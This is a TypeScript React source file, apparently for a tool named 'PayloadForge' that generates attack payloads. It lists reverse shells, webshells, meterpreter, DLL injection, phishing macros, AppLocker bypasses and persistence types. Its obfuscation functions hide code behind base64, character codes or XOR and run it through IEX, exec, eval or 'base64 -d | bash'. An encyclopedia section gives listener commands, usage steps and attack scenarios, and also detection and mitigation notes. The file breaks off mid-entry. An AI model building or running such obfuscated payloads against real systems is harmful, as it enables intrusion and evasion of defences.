// PayloadForge.tsx
import { useState, useEffect, useMemo, useRef } from 'react'
import {
  Swords, Copy, Download, Zap,
  Code, Eye, EyeOff, Shield, Target,
  Globe, Server, Wifi, BookOpen, Play,
  ChevronDown, ChevronUp, Lightbulb,
  AlertCircle, CheckCircle,
  Layers, FileCode, Lock, Unlock,
  Terminal, Network, GitMerge, Database,
  Hash, Activity, ShieldAlert,
  Key, Plus, Clock,
  Hammer} from 'lucide-react'

// ─── Types ────────────────────────────────────────────────
type PayloadType =
  | 'reverse_shell'
  | 'meterpreter'
  | 'bind_shell'
  | 'webshell'
  | 'dll_inject'
  | 'shellcode'
  | 'macro'
  | 'hta'
  | 'reverse_https'
  | 'reverse_http'
  | 'bind_https'
  | 'java_webshell'
  | 'aspx_webshell'
  | 'encrypted_shell'
  | 'powershell_encoded'
  | 'csharp_loader'
  | 'dns_shell'
  | 'icmp_shell'
  | 'smb_shell'
  | 'ssh_shell'
  | 'powershell_plain'
  | 'bash_reverse'
  | 'wmi_shell'
  | 'winrm_shell'
  | 'cobalt_strike_beacon'
  | 'sliver_beacon'
  | 'macos_reverse'
  | 'msbuild_applocker_bypass'
  | 'regsvr32_squiblydoo'
  | 'certutil_downloader'
  | 'excel4_macro'
  | 'dde_injection'
  | 'donut_shellcode'
  | 'com_hijack'
  | 'task_scheduler_persistence'
  | 'registry_persistence'
  | 'service_persistence'

type OutputFormat =
  | 'powershell'
  | 'csharp'
  | 'python'
  | 'go'
  | 'raw_c'
  | 'vba'
  | 'javascript'
  | 'php'
  | 'jsp'
  | 'aspx'
  | 'bash'
  | 'perl'
  | 'ruby'
  | 'batch'
  | 'hta'
  | 'xml'
  | 'inf'

type ObfuscationLevel = 'none' | 'light' | 'medium' | 'heavy'

// ─── Interfaces ────────────────────────────────────────────
interface PayloadInfo {
  type: PayloadType
  name: string
  category: string
  description: string
  whatItDoes: string
  howToUse: string
  whereToUse: string
  pros: string[]
  cons: string[]
  icon: React.ReactNode
  color: string
  defaultPort: number
  requiresLhost: boolean
  requiresLport: boolean
  supportedFormats: OutputFormat[]
  howItWorks: string
  exampleScenario: string
  commonListenerCommand: string
  detectionIndicators: string[]
  mitigationTips: string[]
  references: string[]
  isComplete: boolean
}

// ─── Constants ─────────────────────────────────────────────
const FORMAT_EXTENSIONS: Partial<Record<OutputFormat, string>> = {
  powershell: 'ps1',
  csharp: 'cs',
  python: 'py',
  go: 'go',
  raw_c: 'c',
  vba: 'bas',
  javascript: 'js',
  php: 'php',
  jsp: 'jsp',
  aspx: 'aspx',
  bash: 'sh',
  perl: 'pl',
  ruby: 'rb',
  batch: 'bat',
  hta: 'hta',
  xml: 'xml',
  inf: 'inf',
}

const FORMAT_MIMES: Partial<Record<OutputFormat, string>> = {
  python: 'text/x-python',
  powershell: 'application/octet-stream',
  bash: 'text/x-shellscript',
  csharp: 'text/x-csharp',
  javascript: 'text/javascript',
  php: 'text/x-php',
  jsp: 'application/x-jsp',
  aspx: 'text/x-aspx',
  perl: 'text/x-perl',
  ruby: 'text/x-ruby',
  vba: 'text/x-vba',
  batch: 'text/x-batch',
  hta: 'text/html',
  xml: 'text/xml',
  go: 'text/x-go',
  raw_c: 'text/x-c',
  inf: 'text/plain',
}

const OBFUSCATION_SUPPORTED_FORMATS: OutputFormat[] = ['powershell', 'python', 'csharp', 'javascript', 'bash', 'perl', 'ruby']
const STORAGE_KEY = 'payloadforge_config'

type TimerHandle = ReturnType<typeof setTimeout>

// ─── Obfuscation Helpers ──────────────────────────────────
function utf8ToBase64(str: string): string {
  const bytes = new TextEncoder().encode(str)
  let binary = ''
  for (let i = 0; i < bytes.length; i++) {
    binary += String.fromCharCode(bytes[i])
  }
  return btoa(binary)
}

function obfuscatePowerShell(code: string, level: ObfuscationLevel): string {
  if (level === 'none') return code

  if (level === 'light') {
    const b64 = utf8ToBase64(code)
    return `powershell -EncodedCommand ${b64}`
  }

  if (level === 'medium') {
    const chars = code.split('').map(c => `[char]${c.charCodeAt(0)}`)
    const charArray = chars.join('+')
    return `$code = ${charArray}; IEX $code`
  }

  if (level === 'heavy') {
    const chars = code.split('').map(c => `[char]${c.charCodeAt(0)}`)
    const charArray = chars.join('+')
    const funcName = '_' + Math.random().toString(36).substring(2, 10)
    return `function ${funcName} { $code = ${charArray}; IEX $code }; ${funcName}`
  }

  return code
}

function obfuscatePython(code: string, level: ObfuscationLevel): string {
  if (level === 'none') return code

  if (level === 'light') {
    const b64 = utf8ToBase64(code)
    return `import base64;exec(base64.b64decode("${b64}").decode())`
  }

  if (level === 'medium') {
    const chars = code.split('').map(c => `chr(${c.charCodeAt(0)})`)
    return `exec(''.join([${chars.join(',')}]))`
  }

  if (level === 'heavy') {
    const chunkSize = 32
    const chunks: string[] = []
    for (let i = 0; i < code.length; i += chunkSize) {
      chunks.push(code.slice(i, i + chunkSize))
    }
    const xorKey = Math.floor(Math.random() * 255) + 1
    const encoded = chunks.map((chunk) => 
      Array.from(chunk).map(ch => `(chr(${ch.charCodeAt(0) ^ xorKey}))`).join(',')
    )
    const varName = '_' + Math.random().toString(36).slice(2, 10)
    const extendLines = encoded.map((c) => `${varName}.extend([${c}])`).join('\n')
    return `
${varName} = []
${extendLines}
exec(''.join(chr((ord(c) ^ ${xorKey})) for c in ''.join(${varName})))
`
  }

  return code
}

function obfuscateCSharp(code: string, level: ObfuscationLevel): string {
  if (level === 'none') return code
  
  if (level === 'light') {
    return `// C# obfuscation not fully implemented - use as-is\n${code}`
  }
  
  return `// C# obfuscation not implemented - use code as-is\n${code}`
}

function obfuscateJavaScript(code: string, level: ObfuscationLevel): string {
  if (level === 'none') return code

  if (level === 'light') {
    const b64 = utf8ToBase64(code)
    return `eval(atob("${b64}"))`
  }

  if (level === 'medium') {
    const chars = code.split('').map(c => `String.fromCharCode(${c.charCodeAt(0)})`)
    return `eval(${chars.join('+')})`
  }

  if (level === 'heavy') {
    const chars = code.split('').map(c => `String.fromCharCode(${c.charCodeAt(0)})`)
    const fnName = '_' + Math.random().toString(36).slice(2, 10)
    return `(function ${fnName}(){var s=${chars.join('+')}; eval(s);})();`
  }

  return code
}

function obfuscateBash(code: string, level: ObfuscationLevel): string {
  if (level === 'none') return code
  const b64 = utf8ToBase64(code)
  return `echo "${b64}" | base64 -d | bash`
}

function obfuscatePerl(code: string, level: ObfuscationLevel): string {
  if (level === 'none') return code
  const b64 = utf8ToBase64(code)
  return `echo "${b64}" | base64 -d | perl`
}

function obfuscateRuby(code: string, level: ObfuscationLevel): string {
  if (level === 'none') return code
  const b64 = utf8ToBase64(code)
  return `echo "${b64}" | base64 -d | ruby`
}

function obfuscateCode(
  code: string,
  format: OutputFormat,
  level: ObfuscationLevel
): string {
  if (level === 'none') return code

  if (!OBFUSCATION_SUPPORTED_FORMATS.includes(format)) {
    return code
  }

  switch (format) {
    case 'powershell':
      return obfuscatePowerShell(code, level)
    case 'python':
      return obfuscatePython(code, level)
    case 'csharp':
      return obfuscateCSharp(code, level)
    case 'javascript':
      return obfuscateJavaScript(code, level)
    case 'bash':
      return obfuscateBash(code, level)
    case 'perl':
      return obfuscatePerl(code, level)
    case 'ruby':
      return obfuscateRuby(code, level)
    default:
      return code
  }
}

function renderReferences(references: string[]) {
  return references.map((ref, i) => (
    <li key={i}>
      <a 
        href={ref} 
        target="_blank" 
        rel="noopener noreferrer"
        className="text-cyan-400 hover:underline break-all"
      >
        {ref}
      </a>
    </li>
  ))
}

function substituteListener(command: string, lhost: string, lport: number): string {
  return command
    .replace(/\$\{lhost\}/gi, lhost)
    .replace(/\$\{lport\}/gi, String(lport))
    .replace(/\$LHOST\b/gi, lhost)
    .replace(/\$LPORT\b/gi, String(lport))
    .replace(/\$lhost\b/gi, lhost)
    .replace(/\$lport\b/gi, String(lport))
}

// ─── Encyclopedia ──────────────────────────────────────────
const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
  // 1. Reverse Shell
  {
    type: 'reverse_shell',
    name: 'Reverse Shell',
    category: 'Reverse Shells',
    description: 'The target connects back to your listener.',
    whatItDoes: 'Opens a connection from the compromised machine back to your attacking machine. Gives you a command shell.',
    howToUse: 'Start a listener (nc -lvnp ${lport}), generate the payload, execute it on the target.',
    whereToUse: 'Internal networks, after initial access, when outbound connections are allowed.',
    pros: ['Very reliable', 'Works through firewalls (outbound)', 'Easy to set up', 'Works on almost all platforms'],
    cons: ['Requires outbound access from target', 'Can be blocked by strict egress filtering'],
    icon: <Wifi size={18} />,
    color: 'text-emerald-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['powershell', 'python', 'go', 'raw_c', 'csharp', 'bash', 'perl', 'ruby'],
    howItWorks: 'Opens a TCP socket to LHOST:LPORT, duplicates descriptors, spawns a shell.',
    exampleScenario: 'Upload a reverse shell script to a web server to get a shell back.',
    commonListenerCommand: 'nc -lvnp ${lport}',
    detectionIndicators: [
      'Outbound connections to unusual ports',
      'Process spawning cmd.exe or /bin/sh with network activity',
      'Anomalous parent-child process relationships'
    ],
    mitigationTips: [
      'Implement strict egress filtering',
      'Monitor for suspicious outbound connections',
      'Enable PowerShell logging'
    ],
    references: ['https://attack.mitre.org/techniques/T1071/', 'https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet'],
    isComplete: true
  },
  // 2. Meterpreter
  {
    type: 'meterpreter',
    name: 'Meterpreter',
    category: 'C2 Frameworks',
    description: 'Metasploit\'s advanced payload with powerful post‑exploitation features.',
    whatItDoes: 'Provides an advanced interactive shell with built‑in commands for privilege escalation, pivoting, file transfer, keylogging, etc.',
    howToUse: 'Use with Metasploit handler. Generate payload → execute on target → interact via msfconsole.',
    whereToUse: 'When you need advanced post‑exploitation capabilities.',
    pros: ['Extremely powerful post‑exploitation', 'Built‑in modules', 'Session management', 'Great for pivoting'],
    cons: ['Larger footprint', 'Easier to detect than simple shells', 'Requires Metasploit'],
    icon: <Layers size={18} />,
    color: 'text-cyan-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['csharp', 'python', 'powershell'],
    howItWorks: 'Runs entirely in memory (reflective DLL injection) with an encrypted protocol. Provides extensions for file system, registry, process migration, keylogging, etc.',
    exampleScenario: 'Use Meterpreter to gain a foothold, then pivot to other machines using built‑in port forwarding.',
    commonListenerCommand: 'msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ${lhost}; set LPORT ${lport}; exploit"',
    detectionIndicators: [
      'Unusual process injection (reflective DLL loading)',
      'Encrypted network traffic over non‑standard ports',
      'Presence of known Meterpreter extensions'
    ],
    mitigationTips: [
      'Enable Windows Defender Application Guard and Controlled Folder Access',
      'Monitor for suspicious named pipes or mutexes',
      'Use EDR with behavioral detection'
    ],
    references: ['https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/', 'https://attack.mitre.org/software/S0184/'],
    isComplete: false
  },
  // 3. Bind Shell
  {
    type: 'bind_shell',
    name: 'Bind Shell',
    category: 'Bind Shells',
    description: 'Opens a listening port on the target for you to connect to.',
    whatItDoes: 'Listens on a port; you connect to it to get a shell.',
    howToUse: 'Generate and run on target. Then connect from your machine using netcat.',
    whereToUse: 'When outbound is restricted but inbound is possible.',
    pros: ['No outbound from target needed', 'Good when egress is blocked'],
    cons: ['Requires inbound access to target', 'Often blocked by firewalls', 'Less common'],
    icon: <Server size={18} />,
    color: 'text-amber-400',
    defaultPort: 4444,
    requiresLhost: false,
    requiresLport: true,
    supportedFormats: ['powershell', 'csharp', 'raw_c', 'python'],
    howItWorks: 'Binds to a port, waits for incoming connection, duplicates descriptors, spawns shell.',
    exampleScenario: 'Deploy a bind shell in a segmented network where you can reach the target directly via VPN.',
    commonListenerCommand: 'nc <target-ip> ${lport}',
    detectionIndicators: [
      'Listening ports that are not typical for the system',
      'Processes listening on ports and spawning child processes'
    ],
    mitigationTips: [
      'Block inbound connections from untrusted networks',
      'Use host‑based firewalls to restrict listening ports',
      'Monitor for anomalous port binding using Sysmon'
    ],
    references: ['https://attack.mitre.org/techniques/T1071/'],
    isComplete: true
  },
  // 4. WebShell
  {
    type: 'webshell',
    name: 'WebShell',
    category: 'Web Shells',
    description: 'A web‑based shell uploaded to a web server.',
    whatItDoes: 'A script that allows remote command execution via a web browser or curl.',
    howToUse: 'Upload to a vulnerable web application, then access via URL with parameters.',
    whereToUse: 'After finding file upload vulnerabilities, web app exploitation, or for persistence.',
    pros: ['Works through web ports (80/443)', 'Easy to access', 'Good for maintaining access'],
    cons: ['Can be easily detected', 'Usually requires web server access first', 'Less stealthy'],
    icon: <Globe size={18} />,
    color: 'text-purple-400',
    defaultPort: 80,
    requiresLhost: true,
    requiresLport: false,
    supportedFormats: ['php', 'javascript', 'python', 'jsp', 'aspx'],
    howItWorks: 'Small script that accepts a command parameter via GET/POST and executes it on the server.',
    exampleScenario: 'Upload a PHP webshell to a WordPress site and run system commands.',
    commonListenerCommand: 'curl -X GET "http://target/webshell.php?cmd=id"',
    detectionIndicators: [
      'Suspicious scripts in web directories',
      'Unusual parameters (cmd, exec, system) in web logs',
      'Outbound connections from web server processes'
    ],
    mitigationTips: [
      'Disable unnecessary file uploads and restrict allowed file types',
      'Monitor web server logs for anomalous requests',
      'Use Web Application Firewalls (WAF)'
    ],
    references: ['https://attack.mitre.org/techniques/T1505/'],
    isComplete: true
  },
  // 5. DLL Injection
  {
    type: 'dll_inject',
    name: 'DLL Injection',
    category: 'AppLocker / EDR Bypass',
    description: 'Injects malicious code into a running process.',
    whatItDoes: 'Loads a malicious DLL into the memory of another process to execute code.',
    howToUse: 'Generate DLL → Use injection technique (Process Hollowing, Reflective DLL Injection, etc.) to load it.',
    whereToUse: 'Advanced persistence, process migration, evading detection.',
    pros: ['Stealthy (lives in legitimate process)', 'Good for persistence', 'Can bypass some AV'],
    cons: ['More complex to use', 'Requires finding a target process', 'Higher chance of crashing processes'],
    icon: <Layers size={18} />,
    color: 'text-rose-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['csharp', 'raw_c'],
    howItWorks: 'Uses API calls like VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread to allocate memory, write the DLL, and execute it in the target process.',
    exampleScenario: 'Inject a Meterpreter DLL into explorer.exe to hide your presence.',
    commonListenerCommand: 'nc -lvnp ${lport} (if the DLL connects back)',
    detectionIndicators: [
      'Unusual API calls (VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)',
      'DLLs loaded from non‑standard paths',
      'Process injection events (e.g., Sysmon event 8)'
    ],
    mitigationTips: [
      'Enable Process Mitigation Policies',
      'Monitor for cross‑process memory writes',
      'Use EDR with memory scanning'
    ],
    references: ['https://attack.mitre.org/techniques/T1055/'],
    isComplete: false
  },
  // 6. Shellcode
  {
    type: 'shellcode',
    name: 'Shellcode',
    category: 'AppLocker / EDR Bypass',
    description: 'Raw machine code that can be injected or used in exploits.',
    whatItDoes: 'Small piece of machine code that performs actions (usually spawns a shell or connects back).',
    howToUse: 'Generate shellcode → Embed it into an exploit, loader, or inject it into a process.',
    whereToUse: 'Exploit development, custom loaders, when you need minimal size payloads.',
    pros: ['Very small size', 'Highly flexible', 'Can be used in many contexts'],
    cons: ['Requires knowledge of memory corruption', 'Architecture specific', 'Harder to debug'],
    icon: <Code size={18} />,
    color: 'text-indigo-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['raw_c', 'python', 'go'],
    howItWorks: 'Position‑independent byte sequence that, when executed, performs a specific action (spawns a shell or connects back).',
    exampleScenario: 'Use shellcode as payload in a buffer overflow exploit to get a reverse shell.',
    commonListenerCommand: 'nc -lvnp ${lport}',
    detectionIndicators: [
      'Memory regions with R/W/X permissions',
      'Suspicious shellcode patterns (long NOP sleds)',
      'Anomalous execution flow from known exploited applications'
    ],
    mitigationTips: [
      'Enable ASLR, DEP, and Control Flow Guard',
      'Harden applications against memory corruption',
      'Use exploit mitigation tools'
    ],
    references: ['https://attack.mitre.org/techniques/T1059/'],
    isComplete: false
  },
  // 7. Macro
  {
    type: 'macro',
    name: 'Macro (VBA)',
    category: 'Initial Access / Phishing',
    description: 'Malicious macro embedded in Office documents for phishing.',
    whatItDoes: 'When the victim enables macros, it executes code to download and run a payload.',
    howToUse: 'Generate macro → Embed in Office document → Send via phishing email.',
    whereToUse: 'Phishing campaigns, initial access operations.',
    pros: ['Very effective for initial access', 'Social engineering friendly'],
    cons: ['Users are trained to disable macros', 'Modern Office has protections', 'Requires user interaction'],
    icon: <FileCode size={18} />,
    color: 'text-orange-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['vba'],
    howItWorks: 'VBA macro uses WScript.Shell or Shell to execute commands, often downloading a second‑stage payload.',
    exampleScenario: 'Phishing email with Excel spreadsheet containing macro that downloads a reverse shell.',
    commonListenerCommand: 'nc -lvnp ${lport} (for the downloaded payload)',
    detectionIndicators: [
      'Office processes spawning cmd.exe or powershell.exe',
      'Office files with suspicious macros (AutoOpen)',
      'Unusual network connections from Office applications'
    ],
    mitigationTips: [
      'Disable macros by default in Office (Group Policy)',
      'Use Office 365 advanced threat protection',
      'Educate users about enabling macros only from trusted sources'
    ],
    references: ['https://attack.mitre.org/techniques/T1059/'],
    isComplete: false
  },
  // 8. HTA
  {
    type: 'hta',
    name: 'HTA Application',
    category: 'Initial Access / Phishing',
    description: 'HTML Application that runs with full privileges when opened.',
    whatItDoes: 'Executes JavaScript/VBScript with high privileges to download and execute a payload.',
    howToUse: 'Generate HTA → Host it or send via email → Victim opens the file.',
    whereToUse: 'Phishing, when you need to execute code with high privileges.',
    pros: ['Runs with high privileges', 'Can be disguised as documents'],
    cons: ['Modern Windows has warnings', 'Requires user to open the file', 'Less commonly used now'],
    icon: <Globe size={18} />,
    color: 'text-red-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['javascript'],
    howItWorks: 'Processed by mshta.exe, runs script with user privileges, can launch processes, download files, execute commands.',
    exampleScenario: 'Craft an HTA file that looks like a PDF. Victim double‑clicks it, runs PowerShell to establish reverse shell.',
    commonListenerCommand: 'nc -lvnp ${lport}',
    detectionIndicators: [
      'mshta.exe spawning unusual child processes (cmd.exe, powershell.exe)',
      'Network connections from mshta.exe to remote IPs',
      'HTA files with obfuscated JavaScript'
    ],
    mitigationTips: [
      'Block mshta.exe from running via AppLocker or WDAC',
      'Monitor mshta.exe child process creation',
      'Consider disabling HTA functionality if not needed'
    ],
    references: ['https://attack.mitre.org/techniques/T1218/'],
    isComplete: false
  },
  // 9. Reverse HTTPS
  {
    type: 'reverse_https',
    name: 'Reverse HTTPS',
    category: 'Reverse Shells',
    description: 'Reverse shell over HTTPS, encrypted traffic to evade detection.',
    whatItDoes: 'Establishes an encrypted connection from the target to your HTTPS server, providing a shell.',
    howToUse: 'Set up an HTTPS listener (e.g., using openssl or Metasploit), generate the payload, run it on the target.',
    whereToUse: 'When you need to blend in with normal HTTPS traffic and avoid detection by IDS/IPS.',
    pros: ['Encrypted traffic', 'Can bypass many security appliances', 'Looks like normal web traffic'],
    cons: ['Requires SSL certificate', 'Slightly larger payload', 'Listener is more complex to set up'],
    icon: <Lock size={18} />,
    color: 'text-blue-400',
    defaultPort: 443,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['python', 'powershell', 'go', 'csharp'],
    howItWorks: 'Uses HTTPS (SSL/TLS) to wrap the reverse shell communication, making it harder to inspect and detect.',
    exampleScenario: 'During a red team assessment, you use a reverse HTTPS shell to blend in with web traffic and avoid detection by network monitoring.',
    commonListenerCommand: 'metasploit with PAYLOAD windows/x64/meterpreter/reverse_https LHOST=${lhost} LPORT=${lport}',
    detectionIndicators: [
      'Outbound connections to unusual HTTPS destinations',
      'TLS certificate anomalies',
      'Processes initiating HTTPS connections and spawning shells'
    ],
    mitigationTips: [
      'Implement SSL/TLS decryption at the perimeter',
      'Monitor for anomalous HTTPS traffic patterns',
      'Use application‑layer firewalls to inspect HTTPS payloads'
    ],
    references: ['https://attack.mitre.org/techniques/T1572/'],
    isComplete: false
  },
  // 10. Reverse HTTP
  {
    type: 'reverse_http',
    name: 'Reverse HTTP',
    category: 'Reverse Shells',
    description: 'Reverse shell over plain HTTP, works through proxies.',
    whatItDoes: 'Connects back to an HTTP server, often using GET/POST requests for command and control.',
    howToUse: 'Set up an HTTP listener, generate the payload, execute on target.',
    whereToUse: 'When HTTPS is blocked or you need to go through web proxies.',
    pros: ['Works through most proxies', 'Easy to set up', 'Can be disguised as API calls'],
    cons: ['Plaintext traffic (easily sniffed)', 'More likely to be detected than HTTPS'],
    icon: <Globe size={18} />,
    color: 'text-sky-400',
    defaultPort: 80,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['python', 'powershell', 'go'],
    howItWorks: 'Uses HTTP protocol to send and receive commands, often with base64 encoding or simple parameter passing.',
    exampleScenario: 'Use a reverse HTTP shell to communicate with a C2 server that mimics a legitimate API to avoid suspicion.',
    commonListenerCommand: 'python -m http.server ${lport} (with custom handler)',
    detectionIndicators: [
      'Frequent GET/POST requests with unusual user‑agents or payload patterns',
      'Large outbound HTTP requests',
      'Processes generating HTTP traffic and spawning shells'
    ],
    mitigationTips: [
      'Inspect HTTP traffic for suspicious parameters and headers',
      'Implement egress filtering to limit outbound HTTP to known destinations',
      'Use web proxies with threat intelligence feeds'
    ],
    references: ['https://attack.mitre.org/techniques/T1071.001/'],
    isComplete: false
  },
  // 11. Bind HTTPS
  {
    type: 'bind_https',
    name: 'Bind HTTPS',
    category: 'Bind Shells',
    description: 'Bind shell over HTTPS, encrypted incoming connections.',
    whatItDoes: 'Listens on a port with SSL/TLS encryption, waiting for you to connect securely.',
    howToUse: 'Generate payload, run on target, then connect using an HTTPS client (e.g., openssl s_client) or Metasploit.',
    whereToUse: 'When you need an encrypted bind shell for stealth.',
    pros: ['Encrypted traffic', 'No outbound from target', 'Harder to detect'],
    cons: ['Requires SSL setup', 'Listener must support SSL', 'Incoming connections may be blocked'],
    icon: <Unlock size={18} />,
    color: 'text-indigo-400',
    defaultPort: 443,
    requiresLhost: false,
    requiresLport: true,
    supportedFormats: ['csharp', 'python'],
    howItWorks: 'Binds to a port with SSL/TLS, waits for an encrypted incoming connection, then provides a shell.',
    exampleScenario: 'Deploy a bind HTTPS shell on a server that you can reach directly, ensuring the traffic is encrypted.',
    commonListenerCommand: 'openssl s_client -connect ${lhost}:${lport}',
    detectionIndicators: [
      'Listening ports with SSL/TLS certificates',
      'Unusual certificate fingerprints',
      'Processes listening on non‑standard ports with SSL'
    ],
    mitigationTips: [
      'Block inbound SSL connections to internal hosts',
      'Monitor for new TLS certificates on internal servers',
      'Use host‑based firewalls to restrict listening ports'
    ],
    references: ['https://attack.mitre.org/techniques/T1572/'],
    isComplete: false
  },
  // 12. Java WebShell
  {
    type: 'java_webshell',
    name: 'Java WebShell (JSP)',
    category: 'Web Shells',
    description: 'WebShell written in JSP for Java‑based web applications.',
    whatItDoes: 'Accepts commands via HTTP and executes them on the JVM, returning the output.',
    howToUse: 'Upload the JSP file to a Java web application (e.g., Tomcat, JBoss) and access it via URL.',
    whereToUse: 'After exploiting a Java web application, when you need a web‑based backdoor.',
    pros: ['Works on Java platforms', 'Can be used with common Java servlet containers', 'Good for persistence'],
    cons: ['Requires Java runtime', 'Limited to JVM commands', 'May be detected by WAF'],
    icon: <Server size={18} />,
    color: 'text-orange-300',
    defaultPort: 8080,
    requiresLhost: true,
    requiresLport: false,
    supportedFormats: ['jsp'],
    howItWorks: 'Uses JSP scriptlets to execute system commands using Runtime.exec() and returns the output via HTTP.',
    exampleScenario: 'Upload a JSP webshell to a vulnerable Tomcat server to maintain access.',
    commonListenerCommand: 'curl -X GET "http://target:8080/shell.jsp?cmd=id"',
    detectionIndicators: [
      'JSP files in web directories with suspicious content',
      'Requests with cmd parameter pointing to JSP files',
      'Tomcat/JVM processes spawning child processes'
    ],
    mitigationTips: [
      'Harden web application servers (restrict file uploads)',
      'Monitor web application logs for suspicious requests',
      'Use WAF to block known JSP webshell signatures'
    ],
    references: ['https://attack.mitre.org/techniques/T1505.003/'],
    isComplete: true
  },
  // 13. ASPX WebShell
  {
    type: 'aspx_webshell',
    name: 'ASP.NET WebShell (ASPX)',
    category: 'Web Shells',
    description: 'WebShell written in ASP.NET for Windows IIS servers.',
    whatItDoes: 'Executes commands via HTTP using .NET Process class, returning output.',
    howToUse: 'Upload the ASPX file to an IIS web application and access it.',
    whereToUse: 'After exploiting a Windows web server, for a web‑based backdoor.',
    pros: ['Works on IIS', 'Leverages .NET framework', 'Can be made stealthy'],
    cons: ['Requires .NET', 'May be blocked by application pools', 'Visible in logs'],
    icon: <Server size={18} />,
    color: 'text-purple-300',
    defaultPort: 80,
    requiresLhost: true,
    requiresLport: false,
    supportedFormats: ['aspx'],
    howItWorks: 'Uses the Process class in .NET to run commands and write the output to the HTTP response.',
    exampleScenario: 'Upload an ASPX webshell to a SharePoint server to get command execution.',
    commonListenerCommand: 'curl "http://target/shell.aspx?cmd=whoami"',
    detectionIndicators: [
      'ASPX files with suspicious code in web directories',
      'Unusual parameters in HTTP requests to ASPX files',
      'IIS worker processes spawning child processes'
    ],
    mitigationTips: [
      'Restrict file uploads in IIS',
      'Monitor IIS logs for anomalous requests',
      'Use WAF with .NET‑specific rules'
    ],
    references: ['https://attack.mitre.org/techniques/T1505.003/'],
    isComplete: true
  },
  // 14. Encrypted Shell
  {
    type: 'encrypted_shell',
    name: 'Encrypted Reverse Shell',
    category: 'Reverse Shells',
    description: 'Reverse shell with custom encryption to evade signature detection.',
    whatItDoes: 'Connects back to listener using a custom encryption algorithm (AES, XOR, etc.) to hide the payload.',
    howToUse: 'Generate with chosen encryption method, set up a corresponding decrypting listener.',
    whereToUse: 'When you need to avoid pattern‑based detection, for advanced persistent threats.',
    pros: ['Bypasses signature‑based AV', 'Customizable', 'Less known to security products'],
    cons: ['More complex to implement', 'Listener must support encryption', 'Can be reverse‑engineered'],
    icon: <Lock size={18} />,
    color: 'text-teal-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['python', 'csharp', 'go'],
    howItWorks: 'Encrypts the communication (e.g., with AES) before sending, and decrypts on the listener side.',
    exampleScenario: 'Use an AES‑encrypted reverse shell to exfiltrate data while evading network detection.',
    commonListenerCommand: 'Custom listener with decryption capability',
    detectionIndicators: [
      'Unusual entropy in network packets (high randomness)',
      'Processes performing cryptographic operations',
      'Custom protocols over non‑standard ports'
    ],
    mitigationTips: [
      'Deploy network traffic analysis with anomaly detection',
      'Monitor for unusual encryption patterns',
      'Implement host‑based detection for known encryption libraries'
    ],
    references: ['https://attack.mitre.org/techniques/T1573/'],
    isComplete: false
  },
  // 15. Encoded PowerShell
  {
    type: 'powershell_encoded',
    name: 'Encoded PowerShell',
    category: 'Reverse Shells',
    description: 'PowerShell one‑liner with base64‑encoded command to bypass detection.',
    whatItDoes: 'Runs a base64‑encoded PowerShell script that downloads and executes a second stage.',
    howToUse: 'Generate the encoded command, then run it on target via cmd or PowerShell.',
    whereToUse: 'When you need a short, obfuscated command to deliver a payload via command line.',
    pros: ['Short and concise', 'Bypasses simple string detection', 'Widely usable in Windows'],
    cons: ['Base64 is easily decoded', 'Often flagged by EDR', 'Limited to PowerShell'],
    icon: <Code size={18} />,
    color: 'text-blue-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['powershell'],
    howItWorks: 'The payload is base64‑encoded to evade detection, then executed via powershell -EncodedCommand.',
    exampleScenario: 'Deliver an encoded PowerShell command via a phishing link that downloads and runs a reverse shell.',
    commonListenerCommand: 'nc -lvnp ${lport} (for the second stage)',
    detectionIndicators: [
      'PowerShell command line with -EncodedCommand',
      'Suspicious base64 strings in command line',
      'PowerShell spawning network connections'
    ],
    mitigationTips: [
      'Log and monitor PowerShell command lines',
      'Enable PowerShell script block logging',
      'Block PowerShell if not needed'
    ],
    references: ['https://attack.mitre.org/techniques/T1059.001/'],
    isComplete: false
  },
  // 16. C# Loader
  {
    type: 'csharp_loader',
    name: 'C# Loader',
    category: 'Reverse Shells',
    description: 'C# executable that loads and executes shellcode.',
    whatItDoes: 'A compiled .NET executable that uses Windows API to allocate memory, copy shellcode, and execute it.',
    howToUse: 'Generate the loader, compile it, and run it on the target.',
    whereToUse: 'When you need a small, custom executable to bypass AV by using shellcode.',
    pros: ['Bypasses some AV', 'Can be obfuscated', 'Works on Windows'],
    cons: ['Requires .NET Framework', 'May be flagged by EDR', 'Larger than raw shellcode'],
    icon: <FileCode size={18} />,
    color: 'text-blue-300',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['csharp'],
    howItWorks: 'C# code uses VirtualAlloc, Marshal.Copy, and CreateThread to execute shellcode.',
    exampleScenario: 'Compile a C# loader that injects Meterpreter shellcode into memory to evade file‑based detection.',
    commonListenerCommand: 'nc -lvnp ${lport} (if shellcode connects back)',
    detectionIndicators: [
      'Processes with RWX memory regions',
      'Unusual .NET assemblies loaded',
      'API calls to VirtualAlloc and CreateThread'
    ],
    mitigationTips: [
      'Enable AMSI and .NET ETW monitoring',
      'Use EDR that can detect shellcode injection',
      'Restrict execution of unsigned .NET executables'
    ],
    references: ['https://attack.mitre.org/techniques/T1055/'],
    isComplete: false
  },
  // 17. DNS Shell
  {
    type: 'dns_shell',
    name: 'DNS Shell',
    category: 'Covert Channels',
    description: 'Exfiltrates data and receives commands via DNS queries.',
    whatItDoes: 'Uses DNS requests to send and receive data, tunnelling shell commands through DNS.',
    howToUse: 'Set up a DNS server (or use a service like dnscat2), generate the payload, run it on target.',
